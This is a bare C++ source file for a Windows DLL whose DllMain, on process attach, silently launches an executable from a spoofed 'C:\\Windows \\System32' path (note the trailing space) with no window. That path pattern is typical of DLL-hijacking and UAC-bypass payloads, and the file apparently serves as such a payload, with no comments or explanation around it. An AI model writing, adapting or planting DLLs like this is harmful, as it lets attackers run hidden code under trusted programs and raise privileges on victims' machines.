#include "pch.h"
#include <Windows.h>

#define fatal(a) do{MessageBox(0,a,a,0);ExitProcess(1);} while(0);
#define memzero(base, sz) memset(base, 0, sz)

BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        memzero(&si, sizeof(si));
        memzero(&pi, sizeof(pi));

        CreateProcessA(
            """C:\\Windows \\System32\\wexecute32vol.exe""",
            NULL,
            NULL, NULL, FALSE,
            CREATE_NO_WINDOW,
            NULL, NULL,
            &si, &pi
        );

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}